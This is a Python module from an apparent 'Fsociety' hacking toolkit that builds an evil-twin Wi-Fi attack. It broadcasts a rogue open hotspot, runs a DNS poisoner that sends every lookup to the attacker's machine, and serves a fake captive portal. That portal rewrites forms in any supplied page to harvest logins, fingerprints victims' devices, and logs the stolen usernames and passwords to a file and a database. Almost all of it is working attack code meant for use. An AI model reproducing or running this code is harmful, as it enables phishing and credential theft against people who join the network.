import socket
import threading
import sys
import os
import time
import fcntl
import struct
from urllib.parse import parse_qs
from bs4 import BeautifulSoup
from core.database import FsocietyDatabase

class FsocietyNetworkDaemons:
    @staticmethod
    def get_interface_ip(interface):
        if interface.lower() in ["virtual", "lo", "localhost"]:
            return "127.0.0.1"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            return socket.inet_ntoa(fcntl.ioctl(
                s.fileno(),
                0x8915,  # SIOCGIFADDR
                struct.pack('256s', interface[:15].encode('utf-8'))
            )[20:24])
        except Exception:
            return "192.168.12.1"

    @staticmethod
    def kill_conflicting_services():
        os.system("sudo systemctl stop apache2 nginx dnsmasq hostapd systemd-resolved network-manager NetworkManager 2>/dev/null")
        os.system("sudo killall -9 dnsmasq hostapd apache2 nginx 2>/dev/null")
        time.sleep(0.5)

    @staticmethod
    def activate_wireless_hotspot(interface, ssid, gateway_ip):
        if interface.lower() in ["virtual", "lo", "localhost"]:
            return

        hostapd_conf = f"interface={interface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\nauth_algs=1\nwmm_enabled=0\ncountry_code=PK\nieee80211n=1\n"
        os.makedirs("db", exist_ok=True)
        with open("db/hostapd.conf", "w") as f:
            f.write(hostapd_conf)

        ip_prefix = ".".join(gateway_ip.split(".")[:3])
        dnsmasq_conf = f"interface={interface}\nbind-interfaces\ndhcp-range={ip_prefix}.10,{ip_prefix}.100,255.255.255.0,12h\ndhcp-option=3,{gateway_ip}\ndhcp-option=6,{gateway_ip}\ndhcp-authoritative\naddress=/#/{gateway_ip}\n"
        with open("db/dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)

        print("\033[90m[*] Activating raw kernel network card configurations parameters...\033[0m")
        os.system(f"sudo ip link set dev {interface} down 2>/dev/null")
        time.sleep(0.5)
        os.system(f"sudo iw dev {interface} set type managed 2>/dev/null")
        os.system(f"sudo ip addr flush dev {interface} 2>/dev/null")
        os.system(f"sudo ip addr add {gateway_ip}/24 dev {interface} 2>/dev/null")
        os.system(f"sudo ip link set dev {interface} up 2>/dev/null")
        
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 >/dev/null")
        os.system("sudo iptables -F")
        os.system("sudo iptables -X")
        os.system("sudo iptables -t nat -F")
        os.system("sudo iptables -t nat -X")
        os.system(f"sudo iptables -A INPUT -i {interface} -p udp --dport 67:68 --sport 67:68 -j ACCEPT")
        os.system(f"sudo iptables -A INPUT -i {interface} -p udp --dport 53 -j ACCEPT")
        os.system(f"sudo iptables -A INPUT -i {interface} -p tcp --dport 80 -j ACCEPT")
        
        os.system("sudo hostapd -B db/hostapd.conf >/dev/null 2>&1")
        time.sleep(1.5) 
        os.system("sudo dnsmasq -C db/dnsmasq.conf >/dev/null 2>&1")
        print(f"\033[92m[✅] Broadcasting Open Rogue Hotspot Access Point Live -> SSID: {ssid}\033[0m")
        time.sleep(0.5)

    @staticmethod
    def deactivate_wireless_hotspot(interface):
        os.system("sudo killall -9 dnsmasq hostapd 2>/dev/null")
        if interface.lower() not in ["virtual", "lo", "localhost"]:
            os.system(f"sudo ip link set dev {interface} down 2>/dev/null")
            os.system("sudo iptables -F")
            os.system("sudo iptables -t nat -F")
            os.system("sudo systemctl start systemd-resolved NetworkManager 2>/dev/null")
        print("\033[92m[✅] Network adapters and system routing firewall tables released successfully.\033[0m")

    @staticmethod
    def run_dns_poisoner(port, interface):
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            udp_sock.bind(("0.0.0.0", port))
        except Exception:
            return

        while True:
            try:
                data, addr = udp_sock.recvfrom(2048)
                if len(data) > 12:
                    transaction_id = data[:2]
                    dns_flags = b"\x81\x80"
                    questions = data[4:6]
                    answer_rrs = b"\x00\x01"  
                    authority_rrs = b"\x00\x00"
                    additional_rrs = b"\x00\x00"
                    
                    query_payload = data[12:]
                    idx = 0
                    while idx < len(query_payload):
                        if query_payload[idx] == 0:
                            break
                        idx += 1
                    
                    question_section = query_payload[:idx + 5]
                    dns_answer = b"\xc0\x0c" + b"\x00\x01" + b"\x00\x01" + b"\x00\x00\x00\x3c" + b"\x00\x04"
                    
                    resolved_ip = FsocietyNetworkDaemons.get_interface_ip(interface)
                    ip_bytes = bytes(map(int, resolved_ip.split('.')))
                    
                    spoofed_packet = transaction_id + dns_flags + questions + answer_rrs + authority_rrs + additional_rrs + question_section + dns_answer + ip_bytes
                    udp_sock.sendto(spoofed_packet, addr)
            except Exception:
                continue

    @staticmethod
    def weaponize_html_payload(file_path):
        """Ingests a custom offline HTML file layout and programmatically injects credential hijacking vectors."""
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                soup = BeautifulSoup(f.read(), "html.parser")
            
            # Hijack form execution hooks to point directly back to our listener post
            forms = soup.find_all("form")
            for form in forms:
                form["action"] = "/login"
                form["method"] = "POST"
            
            # Align variable tags so inputs match the backend parser registry structures
            text_inputs = soup.find_all("input", type=lambda t: t in [None, "text", "email", "number"])
            if text_inputs:
                text_inputs[0]["name"] = "user"
                
            pass_inputs = soup.find_all("input", type="password")
            if pass_inputs:
                pass_inputs[0]["name"] = "pass"
                
            return str(soup)
        except Exception as e:
            return f"<html><body><h3>[!] Custom HTML Hijack Processing Failed: {e}</h3></body></html>"

    @staticmethod
    def run_http_portal(port, execution_mode, html_mode_setting, interface):
        tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            tcp_sock.bind(("0.0.0.0", port))
            tcp_sock.listen(20)
        except Exception:
            return

        while True:
            try:
                client_conn, addr = tcp_sock.accept()
                request = client_conn.recv(4096).decode('utf-8', errors='ignore')
                if not request:
                    client_conn.close()
                    continue

                request_lines = request.split("\r\n")
                first_line = request_lines[0] if request_lines else ""
                
                requested_path = "/"
                if len(first_line.split()) > 1:
                    requested_path = first_line.split()[1]

                is_captive_check = any(x in requested_path for x in [
                    "generate_204", "captive", "hotspot-detect", "success.txt", 
                    "ncsi.txt", "connecttest", "kindle-wifi", "wpad"
                ])

                device_profile = "Generic Mobile/PC Adapter"
                for line in request_lines:
                    if line.lower().startswith("user-agent:"):
                        ua = line.lower()
                        if "android" in ua:
                            if "samsung" in ua: device_profile = "Android (Samsung)"
                            elif "huawei" in ua: device_profile = "Android (Huawei)"
                            elif "xiaomi" in ua: device_profile = "Android (Xiaomi)"
                            else: device_profile = "Android Core OS"
                        elif "iphone" in ua: device_profile = "Apple iPhone"
                        elif "ipad" in ua: device_profile = "Apple iPad"
                        elif "windows" in ua: device_profile = "Microsoft Windows PC"
                        elif "linux" in ua: device_profile = "Linux Operator System"
                        break

                http_response = ""
                
                if "POST" in first_line:
                    body = request.split("\r\n\r\n")[-1]
                    if not body and len(request_lines) > 1:
                        body = request_lines[-1]
                    
                    parsed_params = parse_qs(body.strip())
                    if "user" not in parsed_params and "pass" not in parsed_params:
                        client_conn.close()
                        continue
                        
                    username = parsed_params.get("user", ["unknown"])[0]
                    password = parsed_params.get("pass", ["unknown"])[0]

                    if username == "unknown" and password == "unknown":
                        client_conn.close()
                        continue

                    username = username.replace("%40", "@").replace("%3A", ":")
                    password = password.replace("%40", "@")
                    
                    print(f"\n\033[31m\033[1m[☠️ DATA HARVESTED LIVE] Vector Profile: {('CUSTOM_INJECTED_PAGE' if html_mode_setting != 'dedsec' else 'DEDSEC_TESTING_PAGE')}")
                    print(f"    ├── Target Host Address: {addr[0]}:{addr[1]}")
                    print(f"    ├── Identified Device  : {device_profile}")
                    print(f"    ├── Target Identity    : {username}")
                    print(f"    └── Ingested Passphrase: {password}\033[0m\n")
                    sys.stdout.flush()
                    
                    with open("db/captured_vault.log", "a") as log:
                        log.write(f"[{time.strftime('%H:%M:%S')}] User: {username} | Pass: {password} | Device: {device_profile}\n")
                        
                    FsocietyDatabase.log_captured_credentials(username, password, "CUSTOM_PORTAL")

                    if execution_mode == 2:
                        response_body = "<html><body><script>alert('Authentication Timeout - Re-verify Token');window.location.href='/';</script></body></html>"
                    else:
                        response_body = "<html><head><meta http-equiv='refresh' content='0;url=https://google.com'></head><body></body></html>"
                    
                    http_response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(response_body)}\r\nConnection: close\r\n\r\n{response_body}"
                
                elif is_captive_check:
                    resolved_ip = FsocietyNetworkDaemons.get_interface_ip(interface)
                    http_response = f"HTTP/1.1 302 Found\r\nLocation: http://{resolved_ip}/\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                
                else:
                    if html_mode_setting != "dedsec" and os.path.exists(html_mode_setting):
                        response_body = FsocietyNetworkDaemons.weaponize_html_payload(html_mode_setting)
                    else:
                        response_body = "<html><head><title>WiFi Authentication Gateway</title><style>body{background:#111;color:#ff3333;font-family:monospace;text-align:center;padding-top:10%;}input{background:#222;color:#fff;border:1px solid #ff3333;padding:12px;margin:8px;width:280px;font-size:16px;}button{background:#ff3333;color:#000;border:none;padding:14px 30px;font-weight:bold;cursor:pointer;font-size:16px;margin-top:10px;}button:hover{background:#fff;}</style></head><body><h1>☠️ DEDSEC CAPTIVE PORTAL GATEWAY</h1><h3>[ SYSTEM STATUS: OPERATIONAL TESTING MODE ]</h3><p style='color:#888;'>Please enter your network credentials to verify connection access parameters.</p><br><form method='POST' action='/login'><br><input type='password' name='pass' placeholder='Network Passphrase Token' required><br><br><button type='submit'>VERIFY CONNECTION</button></form></body></html>"
                    
                    http_response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(response_body)}\r\nConnection: close\r\n\r\n{response_body}"

                client_conn.sendall(http_response.encode('utf-8'))
                client_conn.close()
            except Exception:
                continue

    @classmethod
    def boot_asynchronous_listeners(cls, interface, mode, html_mode_setting):
        cls.kill_conflicting_services()
        dns_thread = threading.Thread(target=cls.run_dns_poisoner, args=(53, interface), daemon=True)
        http_thread = threading.Thread(target=cls.run_http_portal, args=(80, mode, html_mode_setting, interface), daemon=True)
        dns_thread.start()
        http_thread.start()
